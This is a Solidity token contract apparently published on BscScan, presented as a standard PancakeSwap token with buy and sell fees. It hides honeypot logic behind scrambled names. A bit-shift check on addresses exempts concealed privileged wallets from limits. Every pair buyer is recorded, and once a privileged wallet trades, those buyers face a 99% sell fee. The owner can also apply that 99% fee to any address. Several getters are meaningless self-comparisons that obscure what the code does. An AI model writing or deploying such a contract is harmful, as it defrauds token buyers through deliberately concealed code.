/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DesertedLost is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Deserted Lost ";
    string constant _symbol = "DesertedLost";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedMarketingBotsMin;
    mapping(address => bool) private exemptLiquiditySwapBotsBuyTeamMax;
    mapping(address => bool) private minTeamTradingLaunched;
    mapping(address => bool) private sellBuyLimitBurnReceiver;
    mapping(address => uint256) private teamTradingWalletBotsLiquidityMin;
    mapping(uint256 => address) private receiverLimitExemptTeam;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private minLiquidityExemptBuyModeIs = 0;
    uint256 private botsWalletBurnLimitSell = 7;

    //SELL FEES
    uint256 private exemptLaunchedSellLiquidity = 0;
    uint256 private tradingFeeWalletTeamLaunchedMin = 7;

    uint256 private autoMinTxSell = botsWalletBurnLimitSell + minLiquidityExemptBuyModeIs;
    uint256 private txMarketingLaunchedAutoSwap = 100;

    address private swapReceiverTradingMinTxAutoMode = (msg.sender); // auto-liq address
    address private walletReceiverModeLimit = (0xffA7ADeB448b508F4AdBC7EeFffFE07A882CE9A0); // marketing address
    address private feeLimitReceiverLiquidity = DEAD;
    address private tradingSwapFeeLimitTeam = DEAD;
    address private minIsMaxFeeSellTrading = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingReceiverBuyMin;
    uint256 private minIsReceiverBurnBuy;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private walletSellMarketingExempt;
    uint256 private buyAutoSellMarketing;
    uint256 private maxReceiverSellLiquidity;
    uint256 private exemptMarketingModeTradingBotsBurn;
    uint256 private maxBuyWalletReceiverMode;

    bool private buySwapFeeMarketing = true;
    bool private sellBuyLimitBurnReceiverMode = true;
    bool private liquiditySwapTeamWalletReceiverFee = true;
    bool private botsSellLiquidityIs = true;
    bool private modeBurnBuyExempt = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private launchedExemptIsSell = _totalSupply / 1000; // 0.1%

    
    bool private walletReceiverTradingBots;
    uint256 private botsIsExemptTeamWalletReceiverTx;
    bool private marketingLiquidityBurnMax;
    bool private liquidityBotsAutoTxIsFee;
    bool private swapMarketingMaxExemptTradingTxMode;
    bool private autoMaxLimitBuyBotsExempt;
    bool private botsSellIsFeeReceiverMax;
    uint256 private walletReceiverBotsBurnMinLimitIs;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        walletSellMarketingExempt = true;

        launchedMarketingBotsMin[msg.sender] = true;
        launchedMarketingBotsMin[address(this)] = true;

        exemptLiquiditySwapBotsBuyTeamMax[msg.sender] = true;
        exemptLiquiditySwapBotsBuyTeamMax[0x0000000000000000000000000000000000000000] = true;
        exemptLiquiditySwapBotsBuyTeamMax[0x000000000000000000000000000000000000dEaD] = true;
        exemptLiquiditySwapBotsBuyTeamMax[address(this)] = true;

        minTeamTradingLaunched[msg.sender] = true;
        minTeamTradingLaunched[0x0000000000000000000000000000000000000000] = true;
        minTeamTradingLaunched[0x000000000000000000000000000000000000dEaD] = true;
        minTeamTradingLaunched[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitMarketingAutoBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitMarketingAutoBots(sender, recipient, amount);
    }

    function limitMarketingAutoBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = limitLaunchedTxLiquidity(sender) || limitLaunchedTxLiquidity(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                burnTxBotsLiquidity();
            }
            if (!bLimitTxWalletValue) {
                receiverLimitFeeMax(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return receiverSwapTeamTxMarketingIs(sender, recipient, amount);}

        if (!launchedMarketingBotsMin[sender] && !launchedMarketingBotsMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || minTeamTradingLaunched[sender] || minTeamTradingLaunched[recipient], "Max TX Limit has been triggered");

        if (swapMaxIsTrading()) {exemptBurnReceiverFee();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = burnWalletReceiverLimit(sender) ? maxSwapBuyFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function receiverSwapTeamTxMarketingIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burnWalletReceiverLimit(address sender) internal view returns (bool) {
        return !exemptLiquiditySwapBotsBuyTeamMax[sender];
    }

    function sellLaunchedWalletTrading(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            autoMinTxSell = tradingFeeWalletTeamLaunchedMin + exemptLaunchedSellLiquidity;
            return launchedLimitBuyLiquidity(sender, autoMinTxSell);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoMinTxSell = botsWalletBurnLimitSell + minLiquidityExemptBuyModeIs;
            return autoMinTxSell;
        }
        return launchedLimitBuyLiquidity(sender, autoMinTxSell);
    }

    function maxSwapBuyFee(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(sellLaunchedWalletTrading(sender, receiver == uniswapV2Pair)).div(txMarketingLaunchedAutoSwap);

        if (sellBuyLimitBurnReceiver[sender] || sellBuyLimitBurnReceiver[receiver]) {
            feeAmount = amount.mul(99).div(txMarketingLaunchedAutoSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitLaunchedTxLiquidity(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function launchedLimitBuyLiquidity(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = teamTradingWalletBotsLiquidityMin[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverLimitFeeMax(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        receiverLimitExemptTeam[exemptLimitValue] = addr;
    }

    function burnTxBotsLiquidity() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamTradingWalletBotsLiquidityMin[receiverLimitExemptTeam[i]] == 0) {
                    teamTradingWalletBotsLiquidityMin[receiverLimitExemptTeam[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletReceiverModeLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function swapMaxIsTrading() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeBurnBuyExempt &&
    _balances[address(this)] >= launchedExemptIsSell;
    }

    function exemptBurnReceiverFee() internal swapping {
        uint256 amountToLiquify = launchedExemptIsSell.mul(minLiquidityExemptBuyModeIs).div(autoMinTxSell).div(2);
        uint256 amountToSwap = launchedExemptIsSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoMinTxSell.sub(minLiquidityExemptBuyModeIs.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(minLiquidityExemptBuyModeIs).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(botsWalletBurnLimitSell).div(totalETHFee);

        payable(walletReceiverModeLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                swapReceiverTradingMinTxAutoMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsWalletBurnLimitSell() public view returns (uint256) {
        if (botsWalletBurnLimitSell != launchedExemptIsSell) {
            return launchedExemptIsSell;
        }
        if (botsWalletBurnLimitSell == tradingFeeWalletTeamLaunchedMin) {
            return tradingFeeWalletTeamLaunchedMin;
        }
        if (botsWalletBurnLimitSell != txMarketingLaunchedAutoSwap) {
            return txMarketingLaunchedAutoSwap;
        }
        return botsWalletBurnLimitSell;
    }
    function setBotsWalletBurnLimitSell(uint256 a0) public onlyOwner {
        botsWalletBurnLimitSell=a0;
    }

    function getBotsSellLiquidityIs() public view returns (bool) {
        if (botsSellLiquidityIs != buySwapFeeMarketing) {
            return buySwapFeeMarketing;
        }
        if (botsSellLiquidityIs != sellBuyLimitBurnReceiverMode) {
            return sellBuyLimitBurnReceiverMode;
        }
        return botsSellLiquidityIs;
    }
    function setBotsSellLiquidityIs(bool a0) public onlyOwner {
        if (botsSellLiquidityIs == botsSellLiquidityIs) {
            botsSellLiquidityIs=a0;
        }
        botsSellLiquidityIs=a0;
    }

    function getReceiverLimitExemptTeam(uint256 a0) public view returns (address) {
            return receiverLimitExemptTeam[a0];
    }
    function setReceiverLimitExemptTeam(uint256 a0,address a1) public onlyOwner {
        receiverLimitExemptTeam[a0]=a1;
    }

    function getMinLiquidityExemptBuyModeIs() public view returns (uint256) {
        if (minLiquidityExemptBuyModeIs != autoMinTxSell) {
            return autoMinTxSell;
        }
        if (minLiquidityExemptBuyModeIs == tradingFeeWalletTeamLaunchedMin) {
            return tradingFeeWalletTeamLaunchedMin;
        }
        return minLiquidityExemptBuyModeIs;
    }
    function setMinLiquidityExemptBuyModeIs(uint256 a0) public onlyOwner {
        minLiquidityExemptBuyModeIs=a0;
    }

    function getTradingSwapFeeLimitTeam() public view returns (address) {
        if (tradingSwapFeeLimitTeam != swapReceiverTradingMinTxAutoMode) {
            return swapReceiverTradingMinTxAutoMode;
        }
        if (tradingSwapFeeLimitTeam != walletReceiverModeLimit) {
            return walletReceiverModeLimit;
        }
        if (tradingSwapFeeLimitTeam == tradingSwapFeeLimitTeam) {
            return tradingSwapFeeLimitTeam;
        }
        return tradingSwapFeeLimitTeam;
    }
    function setTradingSwapFeeLimitTeam(address a0) public onlyOwner {
        tradingSwapFeeLimitTeam=a0;
    }

    function getLaunchedExemptIsSell() public view returns (uint256) {
        if (launchedExemptIsSell == minLiquidityExemptBuyModeIs) {
            return minLiquidityExemptBuyModeIs;
        }
        if (launchedExemptIsSell == autoMinTxSell) {
            return autoMinTxSell;
        }
        if (launchedExemptIsSell == launchedExemptIsSell) {
            return launchedExemptIsSell;
        }
        return launchedExemptIsSell;
    }
    function setLaunchedExemptIsSell(uint256 a0) public onlyOwner {
        if (launchedExemptIsSell == exemptLaunchedSellLiquidity) {
            exemptLaunchedSellLiquidity=a0;
        }
        launchedExemptIsSell=a0;
    }

    function getModeBurnBuyExempt() public view returns (bool) {
        if (modeBurnBuyExempt == sellBuyLimitBurnReceiverMode) {
            return sellBuyLimitBurnReceiverMode;
        }
        if (modeBurnBuyExempt == liquiditySwapTeamWalletReceiverFee) {
            return liquiditySwapTeamWalletReceiverFee;
        }
        if (modeBurnBuyExempt == modeBurnBuyExempt) {
            return modeBurnBuyExempt;
        }
        return modeBurnBuyExempt;
    }
    function setModeBurnBuyExempt(bool a0) public onlyOwner {
        modeBurnBuyExempt=a0;
    }

    function getAutoMinTxSell() public view returns (uint256) {
        if (autoMinTxSell != botsWalletBurnLimitSell) {
            return botsWalletBurnLimitSell;
        }
        if (autoMinTxSell != autoMinTxSell) {
            return autoMinTxSell;
        }
        return autoMinTxSell;
    }
    function setAutoMinTxSell(uint256 a0) public onlyOwner {
        autoMinTxSell=a0;
    }

    function getSellBuyLimitBurnReceiverMode() public view returns (bool) {
        if (sellBuyLimitBurnReceiverMode == modeBurnBuyExempt) {
            return modeBurnBuyExempt;
        }
        return sellBuyLimitBurnReceiverMode;
    }
    function setSellBuyLimitBurnReceiverMode(bool a0) public onlyOwner {
        if (sellBuyLimitBurnReceiverMode == buySwapFeeMarketing) {
            buySwapFeeMarketing=a0;
        }
        if (sellBuyLimitBurnReceiverMode != liquiditySwapTeamWalletReceiverFee) {
            liquiditySwapTeamWalletReceiverFee=a0;
        }
        if (sellBuyLimitBurnReceiverMode != sellBuyLimitBurnReceiverMode) {
            sellBuyLimitBurnReceiverMode=a0;
        }
        sellBuyLimitBurnReceiverMode=a0;
    }

    function getExemptLiquiditySwapBotsBuyTeamMax(address a0) public view returns (bool) {
        if (exemptLiquiditySwapBotsBuyTeamMax[a0] != sellBuyLimitBurnReceiver[a0]) {
            return modeBurnBuyExempt;
        }
        if (a0 == walletReceiverModeLimit) {
            return liquiditySwapTeamWalletReceiverFee;
        }
            return exemptLiquiditySwapBotsBuyTeamMax[a0];
    }
    function setExemptLiquiditySwapBotsBuyTeamMax(address a0,bool a1) public onlyOwner {
        if (exemptLiquiditySwapBotsBuyTeamMax[a0] == exemptLiquiditySwapBotsBuyTeamMax[a0]) {
           exemptLiquiditySwapBotsBuyTeamMax[a0]=a1;
        }
        if (a0 != swapReceiverTradingMinTxAutoMode) {
            buySwapFeeMarketing=a1;
        }
        exemptLiquiditySwapBotsBuyTeamMax[a0]=a1;
    }

    function getSellBuyLimitBurnReceiver(address a0) public view returns (bool) {
            return sellBuyLimitBurnReceiver[a0];
    }
    function setSellBuyLimitBurnReceiver(address a0,bool a1) public onlyOwner {
        if (sellBuyLimitBurnReceiver[a0] != exemptLiquiditySwapBotsBuyTeamMax[a0]) {
           exemptLiquiditySwapBotsBuyTeamMax[a0]=a1;
        }
        if (a0 != feeLimitReceiverLiquidity) {
            buySwapFeeMarketing=a1;
        }
        sellBuyLimitBurnReceiver[a0]=a1;
    }

    function getLiquiditySwapTeamWalletReceiverFee() public view returns (bool) {
        return liquiditySwapTeamWalletReceiverFee;
    }
    function setLiquiditySwapTeamWalletReceiverFee(bool a0) public onlyOwner {
        if (liquiditySwapTeamWalletReceiverFee == modeBurnBuyExempt) {
            modeBurnBuyExempt=a0;
        }
        if (liquiditySwapTeamWalletReceiverFee == liquiditySwapTeamWalletReceiverFee) {
            liquiditySwapTeamWalletReceiverFee=a0;
        }
        liquiditySwapTeamWalletReceiverFee=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}